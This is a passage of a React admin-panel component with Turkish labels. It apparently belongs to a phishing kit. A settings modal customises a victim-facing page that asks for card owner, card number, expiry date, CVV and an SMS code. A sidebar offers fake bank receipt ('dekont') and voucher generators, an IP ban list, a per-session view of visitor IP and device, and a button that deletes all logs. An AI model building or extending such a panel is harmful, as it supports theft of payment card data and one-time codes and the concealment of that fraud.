                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.sms_input_label || ""} onChange={e => setGlobalSettings(p => ({...p, sms_input_label: e.target.value}))} />
                </div>

                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <label className="block text-[10px] font-bold text-zinc-500 mb-1">SMS Buton</label>
                    <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.sms_button || ""} onChange={e => setGlobalSettings(p => ({...p, sms_button: e.target.value}))} />
                  </div>
                  <div>
                    <label className="block text-[10px] font-bold text-zinc-500 mb-1">SMS Yükleniyor</label>
                    <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.sms_loading || ""} onChange={e => setGlobalSettings(p => ({...p, sms_loading: e.target.value}))} />
                  </div>
                </div>

                <div className="mt-6 border-t border-zinc-800 pt-4">
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Kart Sayfası Başlık</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.card_title || ""} onChange={e => setGlobalSettings(p => ({...p, card_title: e.target.value}))} />
                </div>
                
                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Kart Sayfası Açıklama</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.card_subtitle || ""} onChange={e => setGlobalSettings(p => ({...p, card_subtitle: e.target.value}))} />
                </div>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Kart Sahibi Etiketi</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.card_owner_label || ""} onChange={e => setGlobalSettings(p => ({...p, card_owner_label: e.target.value}))} />
                </div>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Kart Numarası Etiketi</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.card_number_label || ""} onChange={e => setGlobalSettings(p => ({...p, card_number_label: e.target.value}))} />
                </div>

                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <label className="block text-[10px] font-bold text-zinc-500 mb-1">SKT (Ablauf)</label>
                    <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.card_expiry_label || ""} onChange={e => setGlobalSettings(p => ({...p, card_expiry_label: e.target.value}))} />
                  </div>
                  <div>
                    <label className="block text-[10px] font-bold text-zinc-500 mb-1">CVV</label>
                    <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.card_cvv_label || ""} onChange={e => setGlobalSettings(p => ({...p, card_cvv_label: e.target.value}))} />
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-bold text-zinc-500 mb-1">Kart Butonu</label>
                  <input type="text" className="w-full rounded border border-zinc-800 bg-zinc-900 px-3 py-2 text-sm text-white" value={globalSettings.card_button || ""} onChange={e => setGlobalSettings(p => ({...p, card_button: e.target.value}))} />
                </div>
              </div>
            </div>

            <div className="mt-4 flex justify-end gap-3 border-t border-zinc-800 pt-4 bg-[#111111]">
              <button onClick={() => setShowSettingsModal(false)} className="px-4 py-2 text-sm font-semibold text-zinc-400 hover:text-white transition-colors">İptal</button>
              <button onClick={() => void saveSettings()} disabled={savingSettings} className="rounded-xl bg-blue-600 px-6 py-2 text-sm font-bold text-white hover:bg-blue-500 transition-all shadow-[0_0_15px_rgba(59,130,246,0.3)] disabled:opacity-50">
                {savingSettings ? "Kaydediliyor..." : "Ayarları Kaydet"}
              </button>
            </div>
          </div>
        </div>
      )}

      {showBannedModal && (
        <div className="fixed inset-0 z-[150] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className="w-full max-w-2xl rounded-2xl border border-zinc-800 bg-[#111111] p-6 shadow-2xl">
            <div className="flex justify-between items-center mb-6 border-b border-zinc-800 pb-4">
              <h3 className="text-xl font-bold text-white">Banlı IP Listesi</h3>
              <button onClick={() => setShowBannedModal(false)} className="text-zinc-500 hover:text-white text-xl">✕</button>
            </div>
            
            <div className="max-h-[60vh] overflow-y-auto">
              {bannedIps.length === 0 ? (
                <p className="text-center text-sm text-zinc-500 py-8">Şu anda banlanmış bir IP adresi bulunmuyor.</p>
              ) : (
                <table className="w-full text-left text-sm">
                  <thead className="border-b border-zinc-800 text-xs uppercase text-zinc-500">
                    <tr>
                      <th className="py-3 px-2">IP Adresi</th>
                      <th className="py-3 px-2">Sebep</th>
                      <th className="py-3 px-2">Tarih</th>
                      <th className="py-3 px-2 text-right">İşlem</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-zinc-800">
                    {bannedIps.map((b) => (
                      <tr key={b.ip_address} className="hover:bg-zinc-900/50">
                        <td className="py-3 px-2 font-mono text-white">{b.ip_address}</td>
                        <td className="py-3 px-2 text-zinc-400">{b.reason || "-"}</td>
                        <td className="py-3 px-2 text-zinc-500">{new Date(b.banned_at).toLocaleString('tr-TR')}</td>
                        <td className="py-3 px-2 text-right">
                          <button
                            onClick={() => void handleUnbanIp(b.ip_address)}
                            className="rounded bg-zinc-800 px-3 py-1 text-xs font-bold text-zinc-300 hover:bg-zinc-700 hover:text-white"
                          >
                            Banı Kaldır
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </div>
          </div>
        </div>
      )}

      {showReceiptModal && (
        <ReceiptModal onClose={() => setShowReceiptModal(false)} />
      )}
      
      {showVoucherModal && (
        <VoucherModal onClose={() => setShowVoucherModal(false)} />
      )}

      {showBanksModal && (
        <BanksModal onClose={() => setShowBanksModal(false)} />
      )}
      
      {deviceInfoSession && (() => {
        const uaInfo = parseUserAgent(deviceInfoSession.user_agent);
        return (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className="w-full max-w-md rounded-2xl border border-zinc-800 bg-[#111111] p-6 shadow-2xl">
            <div className="flex justify-between items-center mb-6 border-b border-zinc-800 pb-4">
              <h3 className="text-xl font-bold text-white flex items-center gap-2">
                📱 Cihaz & Bağlantı Bilgisi
              </h3>
              <button onClick={() => setDeviceInfoSession(null)} className="text-zinc-500 hover:text-white text-xl">✕</button>
            </div>
            
            <div className="space-y-4">
              <div className="bg-zinc-900 p-4 rounded-xl border border-zinc-800">
                <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">IP Adresi</div>
                <div className="text-blue-400 font-mono text-lg">{deviceInfoSession.ip_address || "Henüz yansımadı"}</div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="bg-zinc-900 p-4 rounded-xl border border-zinc-800">
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">İşletim Sistemi</div>
                  <div className="text-white font-medium">{uaInfo.os}</div>
                </div>
                <div className="bg-zinc-900 p-4 rounded-xl border border-zinc-800">
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Tarayıcı</div>
                  <div className="text-white font-medium">{uaInfo.browser}</div>
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="bg-zinc-900 p-4 rounded-xl border border-zinc-800">
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Cihaz Türü</div>
                  <div className="text-white font-medium">{uaInfo.device}</div>
                </div>
                <div className="bg-zinc-900 p-4 rounded-xl border border-zinc-800">
                  <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Cihaz modeli</div>
                  <div className="text-white font-medium break-words">{uaInfo.model}</div>
                </div>
              </div>

              <div className="bg-zinc-900 p-4 rounded-xl border border-zinc-800">
                <div className="text-xs font-bold text-zinc-500 mb-1 uppercase tracking-wider">Ham Veri (User-Agent)</div>
                <div className="text-xs text-zinc-400 font-mono break-words leading-relaxed">
                  {deviceInfoSession.user_agent || "Bilinmiyor"}
                </div>
              </div>
            </div>

            <div className="mt-6 flex justify-end">
              <button
                onClick={() => setDeviceInfoSession(null)}
                className="rounded-lg bg-zinc-800 px-6 py-2 text-sm font-bold text-white hover:bg-zinc-700 transition-colors"
              >
                Kapat
              </button>
            </div>
          </div>
        </div>
        );
      })()}

      {/* Sidebar Menü */}
      {showSidebar && (
        <div className="fixed inset-0 z-[300] flex bg-black/85 backdrop-blur-sm" onClick={() => setShowSidebar(false)}>
          <div 
            className="w-64 h-full bg-[#111111] border-r border-zinc-800 p-6 flex flex-col shadow-2xl animate-in slide-in-from-left duration-200"
            onClick={e => e.stopPropagation()}
          >
            <div className="flex items-center justify-between mb-8">
              <h2 className="text-xl font-bold text-white">Menü</h2>
              <button onClick={() => setShowSidebar(false)} className="text-zinc-500 hover:text-white">✕</button>
            </div>
            
            <div className="flex flex-col gap-3">
              <button 
                onClick={() => { setShowSidebar(false); setShowVoucherModal(true); }} 
                className="w-full text-left rounded-lg bg-pink-900/20 border border-pink-500/30 px-4 py-3 text-sm font-semibold text-pink-400 hover:bg-pink-500 hover:text-white transition-all"
              >
                Hediye Çeki
              </button>
              <button 
                onClick={() => { setShowSidebar(false); setShowReceiptModal(true); }} 
                className="w-full text-left rounded-lg bg-indigo-900/20 border border-indigo-500/30 px-4 py-3 text-sm font-semibold text-indigo-400 hover:bg-indigo-500 hover:text-white transition-all"
              >
                Dekont Oluştur
              </button>
              <button 
                onClick={() => { setShowSidebar(false); loadBannedIps(); setShowBannedModal(true); }} 
                className="w-full text-left rounded-lg bg-orange-900/20 border border-orange-500/30 px-4 py-3 text-sm font-semibold text-orange-500 hover:bg-orange-500 hover:text-white transition-all"
              >
                Banlı IP'ler
              </button>
              <button 
                onClick={() => { setShowSidebar(false); setShowSettingsModal(true); }} 
                className="w-full text-left rounded-lg bg-blue-900/20 border border-blue-500/30 px-4 py-3 text-sm font-semibold text-blue-500 hover:bg-blue-500 hover:text-white transition-all"
              >
                Genel Ayarlar
              </button>
              <button 
                onClick={() => { setShowSidebar(false); setShowBanksModal(true); }} 
                className="w-full text-left rounded-lg bg-purple-900/20 border border-purple-500/30 px-4 py-3 text-sm font-semibold text-purple-500 hover:bg-purple-500 hover:text-white transition-all"
              >
                Banka Listesi
              </button>
              <button 
                onClick={() => { setShowSidebar(false); void deleteAllLogs(); }} 
                className="w-full text-left rounded-lg bg-red-900/20 border border-red-500/30 px-4 py-3 text-sm font-semibold text-red-500 hover:bg-red-500 hover:text-white transition-all"
              >
                Tüm Logları Sil
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
}
